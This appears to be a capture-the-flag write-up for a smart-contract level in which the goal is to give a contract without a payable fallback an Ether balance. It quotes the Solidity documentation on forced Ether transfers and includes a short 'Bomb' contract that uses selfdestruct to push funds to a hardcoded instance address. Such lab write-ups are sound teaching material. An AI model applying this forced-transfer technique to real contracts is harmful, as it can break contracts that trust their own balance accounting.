This contract doesn't contain a payable fallback function, which means that it is not possible to transfer Ethereum to it via convential means.

Reading the [Solidity documentation](https://solidity.readthedocs.io/en/v0.7.1/contracts.html#receive-ether-function) on contracts receiving Ether we can see the following section:

> A contract without a receive Ether function can receive Ether as a recipient of a coinbase transaction (aka miner block reward) or as a destination of a selfdestruct.
> 
> A contract cannot react to such Ether transfers and thus also cannot reject them. This is a design choice of the EVM and Solidity cannot work around it.
>
> It also means that address(this).balance can be higher than the sum of some manual accounting implemented in a contract (i.e. having a counter updated in the receive Ether function).

Therefore if we create a contract which calls `selfdestruct` and passes the address of the level instance then we can force it to receive the Ether which our contract had.

This is implemented like so:
```solidity
pragma solidity ^0.4.18;

contract Bomb {
    function() public payable {
        address instance = 0x014dDd248D0E8a14551B4ba426f31D69E07F68eD;
        // Transfer all of our funds to the level instance
        selfdestruct(instance);
    }
}
```
